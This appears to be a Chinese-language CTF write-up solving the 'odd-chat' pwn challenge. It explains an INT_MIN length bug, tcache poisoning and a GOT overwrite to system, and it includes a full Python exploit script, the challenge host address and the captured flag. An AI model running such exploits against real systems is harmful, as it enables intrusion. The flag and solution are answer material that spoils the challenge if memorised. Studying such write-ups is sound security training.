# odd-chat

## 连接信息

```text
nc 101.201.236.114 28699
```

## 最终结果

```text
flag{70425999-84a3-40f7-9043-b1cfee684580}
```

## 保护情况

二进制是 64 位 ELF，`No PIE`，有 `NX` 和 `Canary`，`Partial RELRO`。

这题不适合走栈，核心是堆上的链表节点和一个很隐蔽的负数长度漏洞。

## 程序逻辑

菜单一共 5 个功能：

- `1. Chat`
- `2. Change name`
- `3. View chat history`
- `4. Clear chat`
- `5. Quit`

程序维护了一个单链表，链表头和几个全局变量都在 `.bss`：

- `0x6020d8`：聊天链表头
- `0x6020e8`：消息条数
- `0x6020f0`：当前用户名指针
- `0x602100`：默认用户名缓冲区

每条聊天记录申请 `0x20` 字节：

```c
struct msg {
    char content[0x18];
    struct msg *next;
};
```

`Change name` 的实现很关键，它不是改固定数组，而是：

```c
fgets(name_ptr, 0x30, stdin);
```

也就是说，只要能改掉 `name_ptr`，后面就能把 `fgets` 写到任意可写地址。

## 漏洞点

### 1. 长度计算有 `INT_MIN` 边界错误

聊天时程序会先读一个整数长度，然后自己做一套“取绝对值再 `% 24`”的运算。

正常情况下它想把输入长度限制在 `0..23`，但这个“绝对值”是手写位运算，不是真正安全的 `abs()`。

当输入：

```text
-2147483648
```

也就是 `INT_MIN` 时，取绝对值会溢出，最后得到的长度不是正数，而是：

```text
-8
```

### 2. 读入函数把负数当成超大无符号数

后面的读入函数大致是：

```c
int read_n(char *buf, int len) {
    int i = 0;
    while ((unsigned)i < (unsigned)len) {
        ch = getchar();
        if (ch == '\n') {
            buf[i] = 0;
            return i;
        }
        buf[i++] = ch;
    }
    return i;
}
```

汇编里循环条件用的是 `jb`，本质是无符号比较。

所以 `len = -8` 时，会被解释成一个非常大的正数，直接变成近乎无限长读入，造成堆溢出。

### 3. 消息会被原地加密

消息读完后，程序会按 8 字节分组做一次 17 轮 TEA 变种加密，密钥常量是：

```text
0x114514
```

所以如果想把堆块最终改成某个目标字节序列，发包时不能直接发目标值，而是要发送“加密前原像”。

也就是：

- 想让内存最终变成 `wanted`
- 实际发送时要发 `TEA_decrypt(wanted)`

## 利用思路

题目自带 `libc.so.6`，版本是 `glibc 2.27`，没有 safe-linking，tcache poisoning 很直接。

### 1. 先布置 tcache

先连续申请 4 个 `0x20` chunk，记作：

- `A`
- `B`
- `C`
- `D`

然后 `Clear chat` 全部释放。

由于 tcache 是 LIFO，下一次再申请 `0x20` 时会先拿到 `A`。

### 2. 用 `A` 溢出到空闲块 `B`

重新申请一个块拿到 `A`，然后在聊天长度处输入：

```text
-2147483648
```

这样就能从 `A` 一路写到相邻的空闲块 `B`。

我们只需要改 `B` 这个 tcache entry 的 `fd`，把它伪造成：

```text
0x6020f0
```

也就是全局 `name_ptr` 的地址。

这样接下来：

- 再申请一次，拿到正常的 `B`
- 再申请一次，就会从 tcache 里“分配”出 `0x6020f0`

## 3. 把 `name_ptr` 改成 `atoi@got`

二进制是 `No PIE`，所以 GOT 地址固定。

这里选：

```text
atoi@got = 0x602060
```

原因很简单：

- 程序里会频繁调用 `atoi`
- GOT 里已经是实际 libc 地址
- `%s` 打印这个地址时，前 6 个字节正好是 libc 地址低 6 字节，后面两个高字节是 `00`，天然会截断

因此，当我们成功申请到伪造块 `0x6020f0` 后，只要向这个“块”写入 8 字节：

```text
0x602060
```

就等于把全局 `name_ptr` 改成了 `atoi@got`。

后面程序打印聊天记录时会执行：

```c
printf("[#%d] User: %s\n", idx, name_ptr);
```

于是 `%s` 直接把 `atoi@got` 当字符串打印，泄露出 `atoi` 的实际 libc 地址。

## 4. 由 `atoi` 反推出 libc 基址

题目给的 `libc.so.6` 里偏移如下：

```text
atoi              = 0x40670
system            = 0x4f420
__libc_start_main = 0x21ba0
"/bin/sh"         = 0x1b3d88
```

泄露到 `atoi` 以后：

```python
libc_base = atoi_addr - 0x40670
system = libc_base + 0x4f420
```

## 5. 用 `Change name` 把 `atoi@got` 改成 `system`

前面已经把 `name_ptr` 指到了 `atoi@got`，所以此时菜单 `2. Change name` 就变成了：

```c
fgets(atoi_got, 0x30, stdin);
```

直接写入 `system` 地址即可。

这样之后程序再读菜单选项时，原本执行的是：

```c
choice = atoi(buf);
```

现在就会变成：

```c
choice = system(buf);
```

于是发：

```text
/bin/sh
```

就能拿到 shell。

最后直接：

```text
cat /flag
```

即可。

## exp

下面这份脚本是我最后打远端用的版本，不依赖 pwntools，直接用 Python 自带 `socket`。

```python
import socket
import struct
import time

HOST = "101.201.236.114"
PORT = 28699

ATOI_OFF = 0x40670
SYSTEM_OFF = 0x4f420

NAME_PTR = 0x6020f0
ATOI_GOT = 0x602060


def p64(x):
    return struct.pack("<Q", x & 0xffffffffffffffff)


def u64(x):
    return struct.unpack("<Q", x)[0]


def recvuntil(s, delim, timeout=15):
    s.settimeout(timeout)
    data = b""
    while not data.endswith(delim):
        chunk = s.recv(1)
        if not chunk:
            raise EOFError(data)
        data += chunk
    return data


def recv_all(s, timeout=2.0):
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except Exception:
        pass
    return out


def sendline(s, data):
    if isinstance(data, str):
        data = data.encode()
    s.sendall(data + b"\n")


def tea_dec_block(block8):
    key = 0x114514
    delta = 0x9e3879b9
    v0, v1 = struct.unpack("<II", block8)
    total = (delta * 17) & 0xffffffff
    for _ in range(17):
        v1 = (v1 - ((((v0 << 4) & 0xffffffff) + key) ^ ((total + v0) & 0xffffffff) ^ (((v0 >> 5) + key) & 0xffffffff))) & 0xffffffff
        total = (total - delta) & 0xffffffff
        v0 = (v0 - ((((v1 << 4) & 0xffffffff) + key) ^ ((total + v1) & 0xffffffff) ^ (((v1 >> 5) + key) & 0xffffffff))) & 0xffffffff
    return struct.pack("<II", v0, v1)


def enc_preimage(data):
    assert len(data) % 8 == 0
    return b"".join(tea_dec_block(data[i:i + 8]) for i in range(0, len(data), 8))


class Exploit:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=5)
        recvuntil(self.s, b"Please enter your name: ")
        sendline(self.s, b"aaa")
        recvuntil(self.s, b">> ")

    def menu(self, n):
        sendline(self.s, str(n).encode())

    def chat(self, length, payload):
        self.menu(1)
        recvuntil(self.s, b"How many characters do you want to send: ")
        sendline(self.s, length if isinstance(length, bytes) else str(length).encode())
        recvuntil(self.s, b"> ")
        self.s.sendall(payload + b"\n")
        return recvuntil(self.s, b">> ")

    def clear(self):
        self.menu(4)
        return recvuntil(self.s, b">> ")

    def change_name_raw(self, data):
        self.menu(2)
        recvuntil(self.s, b"Please enter your name: ")
        self.s.sendall(data + b"\n")
        return recvuntil(self.s, b">> ")


e = Exploit()

# 1. 申请 4 个块，清空后把它们放进 tcache
for i in range(4):
    e.chat(1, bytes([0x41 + i]))
e.clear()

# 2. 重新拿到 A
e.chat(1, b"Q")

# 3. 用 A 溢出到 B，伪造 B->fd = 0x6020f0
payload = p64(0) * 3
payload += p64(0)        # B prev_size
payload += p64(0x31)     # B size
payload += p64(NAME_PTR) # B tcache fd
e.chat(b"-2147483648", enc_preimage(payload))

# 4. 再申请一次拿走 B，下一次申请直接拿到 0x6020f0
e.chat(1, b"R")

# 5. 覆盖 name_ptr -> atoi@got
out = e.chat(8, enc_preimage(p64(ATOI_GOT)))

# 6. 从聊天输出里提取 atoi 地址
idx = out.index(b"User: ") + len(b"User: ")
atoi_addr = u64(out[idx:idx + 6].ljust(8, b"\x00"))
libc_base = atoi_addr - ATOI_OFF
system_addr = libc_base + SYSTEM_OFF

print("atoi =", hex(atoi_addr))
print("libc =", hex(libc_base))
print("system =", hex(system_addr))

# 7. Change name 实际写到 atoi@got
e.change_name_raw(p64(system_addr))

# 8. 触发 system("/bin/sh")
sendline(e.s, b"/bin/sh")
time.sleep(0.3)
e.s.sendall(b"cat /flag\n")
print(recv_all(e.s).decode("latin-1", "replace"))
```

## 远端结果

实际打远端时拿到的输出里可以直接看到：

```text
flag{70425999-84a3-40f7-9043-b1cfee684580}
```

## 利用链总结

1. `INT_MIN` 绕过长度限制，拿到堆溢出
2. 利用 `glibc 2.27` 无 safe-linking，做 tcache poisoning
3. 伪造分配到 `0x6020f0`，覆盖全局 `name_ptr`
4. 把 `name_ptr` 指到 `atoi@got`，借 `%s` 泄露 libc
5. 用 `Change name` 把 `atoi@got` 改成 `system`
6. 输入 `/bin/sh`，再 `cat /flag`
